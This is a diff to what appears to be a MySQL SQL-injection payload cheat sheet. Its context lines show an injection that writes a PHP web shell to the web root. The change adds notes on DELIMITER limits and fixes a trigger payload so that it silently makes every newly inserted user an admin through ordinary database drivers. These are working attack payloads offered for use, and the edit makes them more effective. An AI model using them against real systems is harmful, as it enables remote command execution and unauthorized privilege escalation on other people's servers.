@@ -114,11 +114,17 @@ If MySQL has the FILE privilege:
 1'; CREATE PROCEDURE backdoor() BEGIN SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/backdoor.php'; END; -- -
 ```
 
+**Note:** CREATE PROCEDURE with BEGIN/END blocks requires DELIMITER changes, which cannot be sent through most database drivers (DELIMITER is a mysql CLI command, not SQL).
+
 #### Creating Database Triggers
 
+Single-statement triggers can be created without DELIMITER changes:
+
 ```sql
-1'; CREATE TRIGGER after_user_insert AFTER INSERT ON users FOR EACH ROW BEGIN UPDATE users SET role='admin' WHERE id=NEW.id; END; -- -
+1'; CREATE TRIGGER after_user_insert AFTER INSERT ON users FOR EACH ROW UPDATE users SET role='admin' WHERE id=NEW.id; -- -
 ```
+
+**Note:** Multi-statement triggers using BEGIN...END blocks require DELIMITER changes, which are only available in the mysql CLI (not through most database drivers).
 
 #### Setting Variables
 
